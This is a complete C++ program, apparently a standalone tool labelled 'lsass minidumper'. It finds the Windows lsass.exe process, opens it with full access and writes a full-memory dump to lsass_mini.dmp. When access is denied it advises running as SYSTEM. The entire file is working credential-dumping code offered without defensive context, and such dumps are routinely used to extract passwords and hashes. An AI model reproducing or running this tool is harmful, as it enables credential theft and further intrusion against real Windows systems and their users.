#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <Dbghelp.h>

HANDLE ps;
PROCESSENTRY32 psinfo;

int main()
{
	std::cout << "----------------------------" << std::endl;
	std::cout << "++++++lsass minidumper++++++" << std::endl;
	std::cout << "----------------------------" << std::endl;
	ps = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	psinfo.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(ps, &psinfo))
	{
		DWORD err = GetLastError();
		std::cout << "Process32First Error: " << err << std::endl;
	}
	else
	{
		while (Process32Next(ps, &psinfo))
		{
			WCHAR* filename = psinfo.szExeFile;
			int cmp = wcscmp(filename, L"lsass.exe");
			if (cmp == 0)
			{
				std::cout << "lsass.exe found!" << std::endl;
				int lsassPID = psinfo.th32ProcessID;
				std::cout << "lsass PID: " << lsassPID << std::endl;
				HANDLE hlsass = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
				if (hlsass == 0)
				{
					DWORD err = GetLastError();
					if (err == 5)
					{
						std::cout << "OpenProcess Error: " << err << " ---- Access Denied.  \nTry running as system." << std::endl;
						CloseHandle(hlsass);
					}
					else
					{
						std::cout << "OpenProcess Error: " << err << std::endl;
						CloseHandle(hlsass);
					}
				}
				else
				{
					std::cout << "Handle to lsass successful: " << hlsass << std::endl;
					HANDLE minidump = CreateFileA("lsass_mini.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if (minidump == INVALID_HANDLE_VALUE)
					{
						std::cout << "Error with CreateFile HANDLE" << std::endl;
					}
					else
					{
						BOOL bool_dump = MiniDumpWriteDump(hlsass, lsassPID, minidump, MiniDumpWithFullMemory, NULL, NULL, NULL);
						if (bool_dump == 0)
						{
							DWORD err = GetLastError();
							std::cout << "MiniDumpWriteDump Error: " << err << std::endl;
							CloseHandle(minidump);
							CloseHandle(hlsass);
						}
						else
						{
							std::cout << "minidump successful!" << std::endl;
							CloseHandle(minidump);
							CloseHandle(hlsass);
						}
					}

				}
			}
		}
		CloseHandle(ps);
	}
}
